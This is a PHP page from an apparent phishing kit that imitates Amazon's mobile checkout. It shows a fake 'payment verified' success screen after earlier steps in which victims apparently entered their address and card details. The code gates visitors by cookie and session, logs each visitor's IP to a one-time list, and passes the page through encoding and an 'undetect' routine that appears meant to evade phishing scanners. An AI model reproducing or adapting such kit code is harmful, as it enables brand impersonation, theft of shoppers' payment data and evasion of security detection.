<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "Success";
$api->check_cookie();
$api->session("glitch", true, $page);
$api->save($api->onetime, $_SESSION['ip'].PHP_EOL, "a");

$html = '
<!DOCTYPE html>
<html lang="en-us" class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser wpn-supported">
<head>
    <meta name="viewport" content="width=device-width, maximum-scale=2, minimum-scale=1, initial-scale=1, shrink-to-fit=no">
    <meta charset="utf-8">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style-mobile.css").'">
    <meta name="theme-color" content="#131921">
    <style type="text/css">
    .nav-sprite-v3 .nav-sprite {
        background-image: url('.$api->image_encode("assets/img/nav-global-mobile.png")['local'].');
        background-repeat: no-repeat;
    }
    .nav-spinner {
        background-image: url('.$api->image_encode("assets/img/snake.gif")['local'].');
    }
    </style>
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/navbar-mobile.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/navbar-footer-mobile.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/glow.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/sugestion.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop.css").'">
    <title dir="ltr">'.$api->text_encode($lang['billingheader']['titlepayment']).'</title>
    <style>
    .a2hs-ingress-container,
    a[href^="#nav-hbm-a2hs-trigger"] {
        display:none!important
    }
    .a2hs-ingress-container.a2hs-ingress-visible,
    a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible {
        display:block!important
    }
    </style>
    <style>
    @media all and (display-mode:standalone) {
    #chromeless-view-progress-bar,
    #chromeless-view-progress-bar::after {
        position:fixed;
        top:0;
        left:0;
        right:0;
        height:2px
    }
    @keyframes pbAnimation {
        0% {
          right:90%
        }
        100% {
          right:10%
        }
    }
    #chromeless-view-progress-bar {
        background:rgba(255,255,255,.1);
        z-index:9999999
    }
    #chromeless-view-progress-bar::after {
        content:"";
        background:#fcbb6a;
        animation:pbAnimation 10s forwards
        }
    }
    .pi-progress-bar-section {
        display: flex;
        justify-content: space-between;
        margin-top: 60px
    }
    .pi-step {
        align-items: center;
        display: flex;
        flex-direction: column
    }
    .pi-horizontal-divider {
        border-top: 1px solid #d5dbdb;
        height: 1px;
        margin-top: 14px;
        width: 100%
    }
    .pi-horizontal-divider.pi-first-child {
        margin-left: 50%;
        width: 50%
    }
    .pi-horizontal-divider.pi-last-child {
        margin-right: 50%;
        width: 50%
    }
    .pi-step-circle {
        align-items: center;
        border-radius: 50%;
        color: #fff;
        display: flex;
        font-size: 13px;
        height: 28px;
        justify-content: center;
        margin-top: -14px;
        width: 28px
    }
    .pi-step-circle.pi-completed {
        background: #067d62;
        position: relative;
        color: transparent;
    }
    .pi-step-circle.pi-completed::after {
        content: "✔";
        color: #fff;
        font-size: 14px;
        font-weight: bold;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
    }
    .pi-step-circle.pi-active {
        background: #b95b22
    }
    .pi-step-circle.pi-incomplete {
        background: #fff;
        border: thin solid #dadcdf;
        color: #dadcdf
    }
    .pi-step-label {
        font-size: 13px;
        text-align: center;
    }
    @media (min-width: 37.5em) {
      .pi-step-label {
        display: block;
        text-align: center
      }
    }
    .pi-step-label.pi-completed {
        color: #42973d
    }
    .pi-step-label.pi-active {
        color: #b95b22
    }
    .pi-step-label.pi-incomplete {
        color: #767676
    }
    button, input, select {
        font-family: inherit
    }
    h1, h2, h4, h5 {
        padding: 0;
        margin: 0
    }
    h1, h2, h4 {
        padding-bottom: 4px
    }
    h1, h2, h4 {
        text-rendering: optimizeLegibility
    }
    h4:last-child {
        padding-bottom: 0
    }
    h1, h2 {
        padding-bottom: 4px
    }
    h4 {
        padding-bottom: 4px
    }
    p {
        padding: 0;
        margin: 0 0 14px 0
    }
    p:last-child {
        margin-bottom: 0
    }
    p+p {
        margin-top: -4px
    }
    i {
        font-style: italic
    }
    </style>
    <style>
    .a-spacing-base, .a-ws .a-ws-spacing-base {
        margin-bottom: 1.2rem !important;
    }
    .a-row {
        width: 100%;
    }
    .a-section {
        margin-bottom: 1.3rem;
    }
    .apx-add-credit-card-secure-message-icon {
        width: 12px;
        height: 14px;
        margin-right: 4px;
    }
    img {
        vertical-align: top;
    }
    img {
        max-width: 100%;
        border: 0;
    }
    .apx-add-credit-card-secure-message {
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .apx-add-credit-card-bpm-message {
        display: flex;
        text-align: left;
        justify-content: flex-start;
        overflow-wrap: break-word;
    }
    .a-color-secondary, .a-color-tertiary {
        color: #565959 !important;
    }
    .a-size-small {
        font-size: 1.3rem !important;
        line-height: 1.4 !important;
    }
    .a-section:last-child {
        margin-bottom: 0;
    }
    #cardnumber {
        padding-right: 50px; /* beri ruang untuk ikon di kanan */
        background-repeat: no-repeat;
        background-position: right 5px center;
    }
    </style>
    <style data-styled="active" data-styled-version="5.3.11"></style>
</head>
<body class="a-m-us a-aui_72554-c a-aui_a11y_6_837773-t2 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-bw_aui_cxc_alert_measurement_1074111-c">
    <div id="a-page">
        <img src="'.$api->image_encode("assets/img/nav-global.png")['local'].'" style="display:none" alt="">
        <style mark="aboveNavInjectionCSS" type="text/css">
        #nav-mobile-airstream-stripe img {
            max-width: 100%;
        }
        .nav-searchbar-wrapper {
            display: flex;
        }
        </style>
        <header id="nav-main" data-nav-language="en_US" class="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-rec nav-blueheaven">
            <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-standard nav-sprite-v3 celwidget" data-csa-c-id="v21t80-q2zx34-2if81d-5y2gzo" data-cel-widget="Navigation-mobile-navbar">
                <div id="nav-logobar">
                    <div class="nav-left">
                        <a href="javascript: void(0)" id="nav-hamburger-menu" role="button" aria-expanded="false" data-csa-c-id="odfy83-q0m8fu-itci24-c06cto">
                            <i class="nav-icon-a11y nav-sprite"></i>
                        </a>
                        <div id="nav-logo" class="nav-celnav-t11 nav-progressive-attribute">
                            <a href="#" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute">
                                <span class="nav-sprite nav-logo-base"></span>
                                <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
                                <span class="nav-logo-locale">.us</span>
                            </a>
                        </div>
                    </div>
                    <div class="nav-right">
                        <a href="javascript: void(0)" class="nav-a nav-progressive-attribute" id="nav-button-avatar">
                            <i class="nav-icon nav-icon-a11y nav-sprite">your account</i>
                        </a>
                        <a href="#cart" class="nav-a" id="nav-button-cart">
                            <div id="cart-size" class="nav-cart-0 nav-progressive-attribute">
                            <span class="nav-icon nav-sprite">
                                <span id="nav-cart-count" class="nav-cart-count nav-progressive-content nav-celnav-t11">0</span>
                            </span>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="nav-progressive-attribute" id="search-ac-init-data" data-aliases="" data-ime="" data-mkt="1" data-src="completion.amazon.com/search/complete"></div>
                <div id="nav-search-keywords-data" class="nav-progressive-attribute" data-implicit-alias="aps"></div>
                <div class="nav-searchbar-wrapper">
                    <form class="nav-searchbar search-big nav-celnav-t11" id="nav-search-form">
                        <div class="nav-fill">
                            <div class="nav-search-field">
                                <label for="nav-search-keywords" style="display: none;">'.$api->text_encode($lang['billingheader']['searchamazon']).'</label>
                                <input type="text" class="nav-input nav-progressive-attribute" placeholder="'.$api->text_encode($lang['billingheader']['searchamazon']).'" data-aria-clear-label="Clear search keywords" name="k" autocomplete="off" autocorrect="off" autocapitalize="off" dir="auto" value="" id="nav-search-keywords" spellcheck="false">
                                <a class="nav-icon nav-sprite nav-search-clear" tabindex="0" href="javascript:;"></a>
                            </div>
                            <div id="suggestions-template">
                                <div id="suggestions2">
                                    <div class="autocomplete-results-container">
                                        <div class="two-pane-results-container">
                                            <div class="left-pane-results-container"></div>
                                            <div class="right-pane-results-container"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="nav-right">
                            <div class="nav-search-submit nav-celnav-t11">
                                <input type="submit" class="nav-input">
                                <i class="nav-icon nav-sprite"></i>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="glow-subnav-template glow-mobile-subnav nav-celnav-t11" id="nav-subnav-container">
                    <div class="a-declarative nav-global-location-slot-upsell-false" data-action="glow-sheet-trigger" id="nav-global-location-slot" tabindex="0">
                        <div class="nav-sprite" id="nav-packard-glow-loc-icon"></div>
                        <div id="glow-ingress-block">
                            <span class="nav-single-line nav-persist-content" id="glow-ingress-single-line">
                                '.$api->text_encode($lang['billingheader']['deliverto']).' '.$api->text_encode($_SESSION['country']).'
                            </span>
                        </div>
                    </div>
                </div>
                <div id="nav-subnav-toaster"></div>
            </div>
            <div id="nav-progressive-subnav"></div>
        </header>
        <a id="skippedLink" tabindex="-1"></a>
        <div class="a-section">
            <div class="a-section a-spacing-medium a-padding-base a-text-left">
                <div class="katal" id="progress-bar-root">
                    <div class="pi-progress-bar-section" style="margin: 20px 0 10px 0 !important;">
                        <div class="pi-step">
                            <div class="pi-horizontal-divider pi-first-child"></div>
                            <div class="pi-step-circle pi-completed"> 1 </div>
                            <div class="pi-step-label pi-completed">
                                '.$api->text_encode($lang['completed']['verifyaddress']).'
                            </div>
                        </div>
                        <div class="pi-horizontal-divider"></div>
                        <div class="pi-step">
                            <div class="pi-horizontal-divider"></div>
                            <div class="pi-step-circle pi-completed"> 2 </div>
                            <div class="pi-step-label pi-completed">
                                '.$api->text_encode($lang['completed']['verifypayment']).'
                            </div>
                        </div>
                        <div class="pi-horizontal-divider"></div>
                        <div class="pi-step">
                            <div class="pi-horizontal-divider pi-last-child"></div>
                            <div class="pi-step-circle pi-completed"> 3 </div>
                                <div class="pi-step-label pi-completed">
                                    '.$api->text_encode($lang['completed']['complete']).'
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="a-section">
                        <span id="address-ui-widget-content"></span>
                        <div class="a-section" id="address-ui-widgets-enterAddressFormContainer">
                            <span id="address-ui-widget-content"></span>
                            <div class="a-row">
                                <span id="address-ui-widget-content"></span>
                                <div class="a-input-text-group a-spacing-medium a-spacing-top-medium">
                                    <span id="address-ui-widget-content"></span>
                                    <div class="a-row a-spacing-base" id="pp-oeSmjI-13">
                                        <div class="a-column a-span12">
                                            <div aria-live="assertive" class="a-box a-alert a-alert-success" role="alert">
                                                <div class="a-box-inner a-alert-container">
                                                    <h4 class="a-alert-heading"> '.$api->text_encode($lang['completed']['titlecomplete']).' </h4>
                                                    <i class="a-icon a-icon-alert"></i>
                                                    <div class="a-alert-content">
                                                        <ul class="a-unordered-list a-vertical">
                                                            <li>
                                                                <span class="a-list-item"> '.$api->text_encode($lang['completed']['infocomplete']).' </span>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer class="nav-mobile nav-ftr-batmobile">
        <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
            <a id="nav-ftr-gototop" class="nav-a" href="javascript:void(0)">
                <i class="nav-icon"></i>
                <b class="nav-b">
                    '.$api->text_encode($lang['paymentpage']['backtotop']).'
                </b>
            </a>
            <div class="icp-container-mobile">
                <style type="text/css">
                #icp-touch-link-language {
                    display: none;
                }
                </style>
                <a href="#" aria-owns="nav-flyout-icp-footer-flyout" class="icp-touch-link-2" id="icp-touch-link-language">
                    <div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div>
                    <span class="icp-color-base">'.$api->text_encode($lang['billingfooter']['language']).'</span>
                    <span class="nav-arrow icp-up-down-arrow"></span>
                </a>
                <style type="text/css">
                #icp-touch-link-country {
                    display: none;
                }
                </style>
                <a href="#" class="icp-touch-link-2" id="icp-touch-link-country">
                    <span class="icp-flag-3 icp-flag-3-'.strtolower($_SESSION['countrycode']).'"></span>
                    <span class="icp-color-base">'.$api->text_encode($_SESSION['country']).'</span>
                </a>
            </div>
            <ul class="nav-ftr-horiz">
                <li class="nav-li">
                    <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['billingfooter']['conditions']).'</a>
                </li>
                <li class="nav-li">
                    <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['billingfooter']['privacy']).'</a>
                </li>
                <li class="nav-li">
                    <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['billingfooter']['consumer']).'</a>
                </li>
                <li class="nav-li">
                    <a href="#privacyprefs" id="" class="nav-a">'.$api->text_encode($lang['billingfooter']['adsprivacy']).'</a>
                </li>
                <li class="nav-li">
                    <span id="nav-icon-ccba" class="nav-sprite"></span>
                </li>
            </ul>
            <div id="nav-ftr-copyright">
                '.$api->text_encode($lang['billingfooter']['copyright']).'
            </div>
            <div id="nav-ftr-legal"></div>
        </div>
    </footer>
</body>
</html>';

$api->undetect($html);
?>